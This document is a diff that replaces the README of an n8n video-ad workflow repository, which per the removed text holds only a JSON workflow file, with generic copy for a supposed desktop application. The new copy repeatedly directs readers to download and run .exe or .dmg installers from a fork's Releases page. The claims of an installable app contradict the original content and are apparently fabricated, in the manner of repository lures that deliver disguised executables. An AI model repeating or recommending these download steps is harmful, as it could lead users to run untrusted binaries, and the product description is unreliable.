@@ -1,140 +1,91 @@
-# Sora 2 + n8n: Hollywood-Quality Video Ad Generator
+# 🎥 Hollywood-Quality-UGC-Ad-Generator - Create Stunning Video Ads in Minutes
 
-Turn a single product photo into a cinematic, high-converting video ad — powered by Sora 2, GPT-4o, Gemini 2.5 Pro, and n8n.
+## 💡 Overview
+The Hollywood-Quality-UGC-Ad-Generator is an automated tool designed to transform any product photo into a professional video ad. This application uses advanced technologies like n8n, Sora 2, GPT-4o, and Gemini 2.5 Pro to provide cinematic direction, smooth camera motion, and CGI visuals. With this tool, you can easily create engaging advertisement videos that boost your marketing efforts.
 
----
+## 🚀 Getting Started
 
-## Overview
-This project automates the entire AI video ad creation pipeline.  
-Upload a product photo → AI analyzes it → writes a cinematic prompt → generates a professional CGI video ad → uploads and stores everything automatically.
+### Step 1: System Requirements
+Before you begin, ensure your computer meets the following requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later
+- RAM: Minimum 4 GB (8 GB recommended)
+- Storage: At least 500 MB of free space
+- Internet connection
 
-You’ll learn how to orchestrate AI video production using n8n, OpenRouter, Google Drive, Baserow, and Kie.ai’s Sora 2.
+### Step 2: Download the Application
+To get started, visit the Releases page to download the application. Click the link below to go there now.
 
-Perfect for AI automation engineers, no-code builders, and creative studios that want to scale ads with AI.
+[![Download Hollywood-Quality-UGC-Ad-Generator](https://img.shields.io/badge/Download-Hollywod--Quality--UGC--Ad--Generator-blue.svg)](https://github.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/releases)
 
----
+### Step 3: Install the Application
+1. Once you are on the Releases page, look for the latest version.
+2. Click the version number to open the details.
+3. Download the file suitable for your operating system (e.g., .exe for Windows or .dmg for macOS).
+4. Locate the downloaded file on your computer.
 
-## How It Works
+### Step 4: Follow the Installation Process
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the on-screen instructions to install the application.
+  3. Once completed, you can find the application in your Start menu.
 
-### 1. Form Submission
-Trigger: `FormTrigger` node  
-Collects:
-- Product photo  
-- Aspect ratio (portrait or landscape)  
-- Short description  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application to the Applications folder.
+  3. You can find the application in your Applications directory.
 
-Uploads instantly start the workflow.
+### Step 5: Launch the Application
+After installation, you can open the Hollywood-Quality-UGC-Ad-Generator like any other application. 
 
----
+## 🔧 How to Use
 
-### 2. Upload to Google Drive
-The uploaded photo is saved in a “Product Photos” Drive folder.  
-A shareable link (`webContentLink`) is passed forward for analysis and Sora input.
+### Step 1: Upload Your Photo
+- Open the application.
+- Click on the "Upload Photo" button.
+- Select the product photo you want to convert into a video ad.
 
----
+### Step 2: Customize Your Ad
+- Choose your preferred style and direction from the options. The application offers various templates that suit different products.
+- Adjust any specific settings related to music or transitions.
 
-### 3. Product Image Analysis (GPT-4o)
-GPT-4o performs a YAML-based structured analysis of the product image:
-- Ignores background and props  
-- Extracts materials, colors (with HEX codes), textures, and logos  
-- Outputs an exhaustive YAML object describing only the product  
+### Step 3: Generate Your Video
+- Click on the "Generate Video" button.
+- Wait for the application to process your request. This may take a few moments.
 
-This gives later nodes a complete understanding of the subject.
+### Step 4: Review and Export
+- Once the video is generated, preview it to see if it meets your expectations.
+- If you are happy with the result, click the "Export" button to download your video ad.
 
----
+### Step 5: Share Your Video
+You can now use your high-quality video ad across various platforms like social media, websites, or email campaigns. 
 
-### 4. Creative Direction (Gemini 2.5 Pro)
-Gemini generates a Sora 2-compatible cinematic timeline prompt:
-- Defines Vibe, Format, and Genre  
-- Writes a 0–12s Timeline Breakdown:
-  - [0–3s] Hook  
-  - [3–6s] Context  
-  - [6–9s] Climax  
-  - [9–12s] Resolution  
-- Includes camera motion, lighting cues, emotion, and sound design  
+## 📥 Download & Install
+To download the latest version of the application, visit the Releases page again:
 
-This step turns raw data into a film director’s script.
+[![Download Hollywood-Quality-UGC-Ad-Generator](https://img.shields.io/badge/Download-Hollywod--Quality--UGC--Ad--Generator-blue.svg)](https://github.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/releases)
 
----
+## ✅ Features
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Automated Video Creation:** Save time and effort in making high-quality ads.
+- **Multiple Styles:** Choose from various templates suitable for different products.
+- **Cinematic Effects:** Enjoy professional-quality CGI visuals.
+- **Customizable Options:** Tailor your ad with different settings for music and transitions.
 
-### 5. Sora 2 Video Generation (via Kie.ai)
-The cinematic prompt, image URL, and aspect ratio are passed into the  
-“Kie.ai Sora 2 Image → Video” workflow, which returns a CGI-style product ad.  
+## ❓ FAQs
 
-Result: A cinematic, UGC-style commercial generated in minutes.
+### What type of photos work best?
+High-resolution product photos work best for converting into striking video ads. Aim for clear images with good lighting.
 
----
+### Do I need internet access?
+Yes, an internet connection is required for downloading the application and generating your videos.
 
-### 6. File Management
-- Video is downloaded via HTTP Request node  
-- Uploaded to Google Drive “Product Videos” folder  
-- Metadata (image, video, status, description) logged in Baserow  
+### Can I use this tool for different types of products?
+Absolutely! Whether it’s cosmetics, tech gadgets, or home decor, this tool works for a variety of products.
 
-Every output is archived, searchable, and ready to share.
+### Is there customer support available?
+Yes, you can reach out for help through the repository's issue tracker or community forums.
 
----
+## 📢 Community and Support
+Join our community to share your creations and get tips. You can connect with other users and get valuable insights. Follow our discussions and updates on issues and enhancements.
 
-## Tech Stack
-| Tool | Purpose |
-|------|----------|
-| n8n | Workflow orchestration |
-| Sora 2 (Kie.ai) | Text-to-video generation |
-| GPT-4o | Image analysis and YAML output |
-| Gemini 2.5 Pro | Creative direction and timeline prompt |
-| Baserow | Data logging and asset management |
-| Google Drive | File storage |
-
----
-
-## Repository Contents
-| File | Description |
-|------|-------------|
-| `47_AI Ads Sora.json` | Main n8n workflow file |
-| `README.md` | Documentation (this file) |
-
----
-
-## Setup
-
-### 1. Clone the Repository
-
-### 2. Import Workflow into n8n
-
-- Open your **n8n dashboard**  
-- Click **Import Workflow** → upload `47_AI Ads Sora.json`
-
----
-
-### 3. Configure Credentials
-
-Add the following integrations:
-
-- **OpenRouter API** (for GPT-4o + Gemini 2.5 Pro)  
-- **Kie.ai** (Sora 2 endpoint)  
-- **Google Drive OAuth2**  
-- **Baserow API**
-
----
-
-
-### 4. Deploy
-
-- Run the workflow once to generate your unique **Form URL**  
-- Upload a product photo and watch your cinematic ad appear in your Drive
-
-
----
-
-📧 **Email me directly**: contact@loopsera.com
-For quick questions, customisation requests, or workflow troubleshooting.
-
-🌐 **Visit my website**: [https://loopsera.com](https://loopsera.com)
-Explore more automation templates, services, and case studies.
-
-📞 **Book a Discovery Call**: [https://cal.com/loopsera/discoverycall](https://cal.com/loopsera/discoverycall)
-For businesses that need a custom AI solutions built.
-
-🎓 **1-on-1 Coaching Session**: [https://cal.com/loopsera/n8n-ai-agent-coaching-session](https://cal.com/loopsera/n8n-ai-agent-coaching-session)
-Personalised coaching to help you build, troubleshoot, or optimise n8n AI workflows. Perfect for both beginners and advanced users.
-
-💬 **Join the AI Builder’s Boardroom (Skool Community)**: [https://www.skool.com/ai-builders-boardroom-1717](https://www.skool.com/ai-builders-boardroom-1717) — a professional community for builders creating AI agents that talk, listen, and sell, focused on deploying the digital workforce of the future.
+This tool aims to be your go-to solution for creating compelling video ads effortlessly. Start generating high-quality ads today!
